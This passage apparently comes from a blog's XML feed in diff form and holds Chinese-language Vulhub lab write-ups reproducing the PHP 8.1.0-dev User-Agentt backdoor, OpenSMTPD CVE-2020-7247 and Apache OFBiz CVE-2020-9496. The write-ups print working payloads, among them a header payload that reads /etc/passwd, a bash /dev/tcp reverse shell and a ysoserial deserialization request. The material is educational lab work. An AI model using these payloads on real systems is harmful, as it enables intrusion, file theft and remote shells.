+    <content><![CDATA[<h1 id="PHP-8-1-0-dev-User-Agentt-后门"><a href="#PHP-8-1-0-dev-User-Agentt-后门" class="headerlink" title="PHP 8.1.0-dev User-Agentt 后门"></a>PHP 8.1.0-dev User-Agentt 后门</h1><p>PHP 8.1.0-dev 版本于 2021 年 3 月 28 日被植入后门，但后门很快被发现并移除。当服务器上存在此后门时，攻击者可以通过发送<strong>User-Agentt</strong>标头来执行任意代码。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://news-web.php.net/php.internals/113838" target="_blank" rel="noopener">https://news-web.php.net/php.internals/113838</a></li>
+<li><a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d" target="_blank" rel="noopener">https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d</a></li>
+<li><a href="https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a" target="_blank" rel="noopener">https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，服务运行于<code>http://192.168.44.132:8080</code>。</p>
+<p>发送以下请求以执行代码<code>var_dump(233*233);</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">User-Agentt: zerodiumvar_dump(233*233);</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211206/16387882849482.png" alt="image-20211116172033506"></p>
+<p>将字段后面poc修改为<code>zerodiumsystem(&quot;cat /etc/passwd&quot;);</code>读取文件</p>
+<p><img src="https://image.3001.net/images/20211206/16387882871136.png" alt="image-20211116172113356"></p>
+<p>修改payload执行反弹shell，并设置监听，将poc修改为以下反弹shell的poc</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zerodiumsystem(&quot;bash -c &#39;exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.44.1&#x2F;4444 0&gt;&amp;1&#39;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211206/16387882894301.png" alt="image-20211116172400753"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OpenSMTPD 远程代码执行漏洞 (CVE-2020-7247)</title>
+    <url>/2021/11/11/OpenSMTPD%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2020-7247)/</url>
+    <content><![CDATA[<h1 id="OpenSMTPD-远程代码执行漏洞-CVE-2020-7247"><a href="#OpenSMTPD-远程代码执行漏洞-CVE-2020-7247" class="headerlink" title="OpenSMTPD 远程代码执行漏洞 (CVE-2020-7247)"></a>OpenSMTPD 远程代码执行漏洞 (CVE-2020-7247)</h1><p>OpenSMTPD 是一个适用于 unix 操作系统（BSD、MacOS、GNU/Linux）的 smtp 服务程序，遵循 RFC 5321 SMTP 协议。OpenSMTPD 最初是为 OpenBSD 操作系统开发的，是 OpenBSD 项目的一部分。由于其开源特性，已分发到其他 unix 平台。根据 ISC 许可证，该软件可供所有人免费使用和重复使用。</p>
+<p><code>CVE-2020-7247</code> 是由于 OpenSMTPD 在实施 RFC 5321 的过程中对发件人/收件人的验证不严造成的。</p>
+<p>2020 年 1 月 29 日，OpenSMTPD 小组正式提交了<code>CVE-2020-7247</code>GitHub 存储库中的 修复程序。修复后对应的版本是<code>OpenSMTPD 6.6.2p1</code>.</p>
+<p><strong>参考：</strong></p>
+<ul>
+<li><a href="https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt" target="_blank" rel="noopener">https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt</a></li>
+<li><a href="https://www.exploit-db.com/exploits/47984" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47984</a></li>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247</a></li>
+<li><a href="https://www.anquanke.com/post/id/197689" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197689</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>SMTPD服务器启动后，连接8825端口，得到结果（<code>f5215e4fc3fd</code>为容器ID）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc 192.168.44.132 8825 -v</span><br><span class="line">220 f5215e4fc3fd ESMTP OpenSMTPD</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211116/16370511361853.png" alt="image-20211116155414177"></p>
+<p>使用<a href="https://www.exploit-db.com/exploits/47984" target="_blank" rel="noopener">Exploit-DB</a>获得反向 shell：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 poc.py 192.168.44.132 8825 &lt;command&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211116/16370511382089.png" alt="image-20211116161051586"></p>
+<p>成功写入文件</p>
+<p><img src="https://image.3001.net/images/20211116/16370511419088.png" alt="image-20211116161009566"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>OpenSMTPD</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ApacheOfBiz 中 XMLRPC 参数的不安全反序列化 (CVE-2020-9496)</title>
+    <url>/2021/11/11/ApacheOfBiz%20%E4%B8%AD%20XMLRPC%20%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20(CVE-2020-9496)/</url>
+    <content><![CDATA[<h1 id="ApacheOfBiz-中-XMLRPC-参数的不安全反序列化-CVE-2020-9496"><a href="#ApacheOfBiz-中-XMLRPC-参数的不安全反序列化-CVE-2020-9496" class="headerlink" title="ApacheOfBiz 中 XMLRPC 参数的不安全反序列化 (CVE-2020-9496)"></a>ApacheOfBiz 中 XMLRPC 参数的不安全反序列化 (CVE-2020-9496)</h1><p>Apache OFBiz 是一个开源的企业资源规划 (ERP) 系统。它提供了一套企业应用程序，可以集成和自动化企业的许多业务流程。</p>
+<p>OfBiz 在 处公开一个 XMLRPC 端点<code>/webtools/control/xmlrpc</code>。这是一个未经身份验证的端点，因为身份验证是基于每个服务应用的。但是，XMLRPC 请求是在身份验证之前处理的。作为此处理的一部分，远程调用的任何序列化参数都被反序列化，因此如果类路径包含任何可用作实现远程代码执行的小工具的类，攻击者将能够在任何 OfBiz 服务器上运行任意系统命令与运行 OfBiz 的 servlet 容器具有相同的权限。</p>
+<p>参考：</p>
+<ol>
+<li><a href="https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz" target="_blank" rel="noopener">https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz</a></li>
+<li><a href="https://github.com/dwisiswant0/CVE-2020-9496" target="_blank" rel="noopener">https://github.com/dwisiswant0/CVE-2020-9496</a></li>
+<li><a href="https://www.cnblogs.com/ph4nt0mer/p/13576739.html" target="_blank" rel="noopener">https://www.cnblogs.com/ph4nt0mer/p/13576739.html</a></li>
+</ol>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>看到登录页面<code>https://192.168.44.132/myportal/control/main</code></p>
+<p><img src="https://image.3001.net/images/20211116/16370486253744.png" alt="image-20211115152222288"></p>
+<p>默认没有响应错误信息，我们无法使用<a href="https://github.com/dwisiswant0/CVE-2020-9496" target="_blank" rel="noopener">参考链接2</a>的POC重现该漏洞，因此请向<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>寻求帮助。</p>
+<p>生成 CommonsBeanutils1 负载：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 &quot;touch &#x2F;tmp&#x2F;success&quot; | base64 | tr -d &quot;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211116/1637048628110.png" alt="image-20211115152819711"></p>
+<p>替换<code>[base64-payload]</code>并发送请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webtools&#x2F;control&#x2F;xmlrpc HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 4093</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">  &lt;methodName&gt;ProjectDiscovery&lt;&#x2F;methodName&gt;</span><br><span class="line">  &lt;params&gt;</span><br><span class="line">    &lt;param&gt;</span><br><span class="line">      &lt;value&gt;</span><br><span class="line">        &lt;struct&gt;</span><br><span class="line">          &lt;member&gt;</span><br><span class="line">            &lt;name&gt;test&lt;&#x2F;name&gt;</span><br><span class="line">            &lt;value&gt;</span><br><span class="line">              &lt;serializable xmlns&#x3D;&quot;http:&#x2F;&#x2F;ws.apache.org&#x2F;xmlrpc&#x2F;namespaces&#x2F;extensions&quot;&gt;[base64-payload]&lt;&#x2F;serializable&gt;</span><br><span class="line">            &lt;&#x2F;value&gt;</span><br><span class="line">          &lt;&#x2F;member&gt;</span><br><span class="line">        &lt;&#x2F;struct&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;param&gt;</span><br><span class="line">  &lt;&#x2F;params&gt;</span><br><span class="line">&lt;&#x2F;methodCall&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211116/16370486311557.png" alt="image-20211116154144176"></p>
+<p><code>touch /tmp/success</code> 在容器中成功执行：</p>
+<p><img src="https://image.3001.net/images/20211116/16370486343841.png" alt="image-20211116154208548"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache OfBiz</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ntopng 身份验证绕过 (CVE-2021-28073)</title>
     <url>/2021/11/11/ntopng%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20(CVE-2021-28073)/</url>
     <content><![CDATA[<h1 id="ntopng-身份验证绕过-CVE-2021-28073"><a href="#ntopng-身份验证绕过-CVE-2021-28073" class="headerlink" title="ntopng 身份验证绕过 (CVE-2021-28073)"></a>ntopng 身份验证绕过 (CVE-2021-28073)</h1><p>Ntopng 是一个被动的网络监控工具，专注于可以从服务器捕获的流量中获取的流量和统计信息。</p>
